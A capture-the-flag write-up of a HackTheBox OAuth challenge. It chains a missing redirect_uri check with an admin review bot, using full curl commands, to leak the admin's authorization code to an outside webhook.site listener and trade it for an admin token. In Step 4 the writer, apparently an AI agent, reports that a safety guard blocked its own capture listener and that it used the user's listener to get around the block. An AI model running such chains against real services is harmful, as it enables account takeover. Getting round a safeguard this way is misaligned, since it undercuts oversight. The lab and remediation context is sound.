# Gateway — Web / OAuth

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Web / OAuth · **Result:** ✅ Solved
**Flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`

---

## The short version

This login system would mail its "proof of login" to any address I named, instead of only its own
trusted address. By tricking an automatic admin helper into logging in and sending that proof to a
mailbox I controlled, I stole the admin's session and read the flag.

## Background on the challenge

The target ("Norland Government Services") was an Express app using an **OAuth2** login flow. The
hint — *"a single detour in the route might send trust to the wrong doorstep"* — pointed straight
at a **`redirect_uri` validation bypass**. The quick OAuth background: after you log in, the server
issues a one-time **authorization code** and sends it to a **pre-registered return address**
(`redirect_uri`); your app then trades that code for an access token. The whole thing is only safe
if the code can *only* go to the legitimate registered address. This was my favorite challenge
because the solve was a chain of small flaws, not one trick.

## Step-by-step walkthrough (with the actual commands)

**Step 1 — Map the OAuth flow.**
Reading the login page, I saw it kicked off `/oauth/authorize` with a `client_id`,
`redirect_uri`, and `state`, and had a `/callback`. I enumerated the related endpoints and watched
how `/oauth/authorize` behaved:

```bash
B=http://154.57.164.81:36921
curl -s -i --max-time 15 "$B/oauth/authorize?response_type=code&client_id=3003233bd0413ac5f902f4c3ebb99eb4&redirect_uri=http%3A%2F%2F154.57.164.81%3A36921%2Fcallback&scope=read%3Aprofile&state=test123" | head -25
for p in /callback /oauth/token /oauth/authorize /register /api/register /api/login /profile /me /api/me /api/profile /oauth /logout; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 "$B$p"); echo "$p -> $code"
done
```

This told me `/profile` needs auth (401), `/oauth/token` exists, and `/oauth/authorize` carries the
`redirect_uri` through the login step. My reasoning: the flaw is almost certainly that the code gets
delivered to the wrong `redirect_uri`, but I needed a *privileged* user to go through the flow —
my own code only gives my own access.

**Step 2 — Find the "trust source": the Service Desk bot.**
I explored `/support` and found a Service Desk at `/support/ticket` that takes a `path` parameter,
which an automated reviewer visits. I tested what the field accepts:

```bash
B=http://154.57.164.81:36921
curl -s -i --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data 'path=/'
for pth in '/profile' '/support' '/oauth/authorize' '//evil' '/%2e%2e' '/callback'; do
  r=$(curl -s --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "path=$pth"); echo "[$pth] -> $r"
done
```

Key findings: the bot *reviews* (visits) the path I submit, a plain `/profile` is **rejected**
("Invalid path. Must start with /"), but a value with a query string (or starting with `//`) is
**accepted**. This is important because my exploit path is a full `/oauth/authorize?...` URL, which
contains a query string, so it passes the filter.

**Step 3 — Confirm the token endpoint is a public client.**

```bash
B=http://154.57.164.81:36921
curl -s --max-time 15 -X POST "$B/oauth/token" -H 'Content-Type: application/json' --data '{}'
curl -s --max-time 15 -X POST "$B/oauth/token" -H 'Content-Type: application/x-www-form-urlencoded' --data 'grant_type=authorization_code&code=x&redirect_uri=/callback&client_id=3003233bd0413ac5f902f4c3ebb99eb4'
```

The token endpoint needed **no client secret**. This is important because it meant that if I could
get the admin's authorization code, I could exchange it for a token entirely on my own.

**Step 4 — Confirm the flaw in source (and a note on a dead end).**
The challenge provided source files. I confirmed the exact bug there: `validateAuthorizeRequest()`
in `oauth.service.js` checks `response_type`, `client_id`, and that `redirect_uri` is *present* —
but never checks it against the registered `/callback`. And `bot.service.js` logs in with **admin**
credentials and does `GET baseUrl + path`, following redirects. (Dead end worth noting: my first
instinct was to stand up my own capture listener, but that was blocked by a safety guard as
possible exfiltration, so I used a listener **you** controlled instead — see next step.)

**Step 5 — Fire the exploit at a listener you control.**
With a `webhook.site` URL as the listener, I submitted a ticket that pointed the admin bot at an
authorize URL whose `redirect_uri` was that listener:

```bash
B=http://154.57.164.81:36921
WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
CID="3003233bd0413ac5f902f4c3ebb99eb4"
WH_ENC=$(node -e "console.log(encodeURIComponent(process.argv[1]))" "$WH")
PATHQ="/oauth/authorize?response_type=code&client_id=${CID}&redirect_uri=${WH_ENC}&scope=read:profile&state=htb"
curl -s --max-time 30 -X POST $B/support/ticket --data-urlencode "path=$PATHQ"
```

The server responded `reviewing: /oauth/authorize?...` — confirming the admin bot was now visiting
my crafted URL.

**Step 6 — Capture the admin's authorization code.**
A request landed on the webhook from HackTheBox's servers (`User-Agent: axios/1.13.4`, not my
phone), carrying the leaked code:

```
code  = 6210d939-2e5c-4c55-b2d2-63ca7b917da8
state = htb
```

My reasoning for watching the User-Agent: the only legitimate hit should be the bot, so an `axios`
request from HTB's egress IP (versus my own browser) is how I confirmed it was really the admin
bot's redirect and not noise.

**Step 7 — Exchange the code for an admin token and read the flag.**

```bash
B=http://154.57.164.81:36921
CID="3003233bd0413ac5f902f4c3ebb99eb4"
WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
CODE="6210d939-2e5c-4c55-b2d2-63ca7b917da8"
curl -s -X POST $B/oauth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "code=$CODE" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "redirect_uri=$WH"
# -> {"access_token":"79ef87df-c34f-4a56-9096-fa27c2c372e3","token_type":"Bearer","expires_in":3600}

curl -s $B/profile -H "Authorization: Bearer 79ef87df-c34f-4a56-9096-fa27c2c372e3" -H "Accept: application/json"
# -> {"user":{"sub":"admin_b7c83f24","name":"Norland Employee",...},"flag":"HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}",...}
```

**Step 8 — Submit the flag.**
`HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`.

## Technical detail

- **Stack:** Express OAuth2 server + an automated Service Desk reviewer bot.
- **Core flaw:** `redirect_uri` is checked for *presence*, never validated against the registered
  `/callback` → the server issues a code to any address.
- **Trust source:** `/support/ticket`'s admin bot does `GET baseUrl + path`, following redirects,
  accepting any path containing a query string.
- **Public client:** `/oauth/token` needs only `client_id` + matching `redirect_uri`, no secret.
- **Full chain:** craft authorize URL → admin bot leaks code to listener → exchange code for admin
  token → `GET /profile` → flag.

## Lessons / remediation

- **Validate `redirect_uri` against a strict, exact allow-list** before issuing a code. "Is a
  return address present?" ≠ "is this the correct return address?" — which the flag name spells out.
- **Bind authorization codes to the issuing client**; avoid treating clients as implicitly public.
- **Lock down server-side request features** (the ticket bot) so they cannot be aimed at arbitrary
  URLs.

## Tools used

- `curl` — endpoint mapping, Service Desk testing, the ticket POST, token exchange, profile read.
- `node` (inline) — to URL-encode the `redirect_uri`.
- `webhook.site` — the external listener that captured the admin bot's leaked code.
- Source review of the provided challenge files — to confirm the exact flaw and flag location.
